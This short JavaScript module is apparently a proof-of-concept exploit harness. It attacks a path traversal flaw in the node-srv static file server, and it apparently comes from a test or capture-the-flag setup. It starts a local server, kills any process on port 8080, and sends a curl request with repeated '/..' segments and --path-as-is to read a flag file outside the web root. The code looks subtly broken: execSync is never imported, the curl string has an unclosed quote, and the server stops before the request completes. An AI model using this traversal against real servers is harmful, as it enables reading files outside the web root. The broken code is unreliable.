function exploitFunction() {
  const path = require("path");
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  function genstr(n) {
    return "/..".repeat(50) + pathToFlag;
  }

  const Server = require("node-srv");
  const fs = require("fs");
  const { exec } = require("child_process");

  let hostsFile = fs.readFileSync(pathToFlag).toString();

  try {
    execSync("fuser -k 8080/tcp", () => {});
  } catch (e) {}

  let srv = new Server({
    port: 8080,
    root: "./",
    logs: true,
  }, function () {});

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr(50)}`; // Using the payload from the getPayload function

  exec(attack_string, (error, stdout) => {
    return stdout;
  });

  srv.stop();
}

module.exports = { exploitFunction };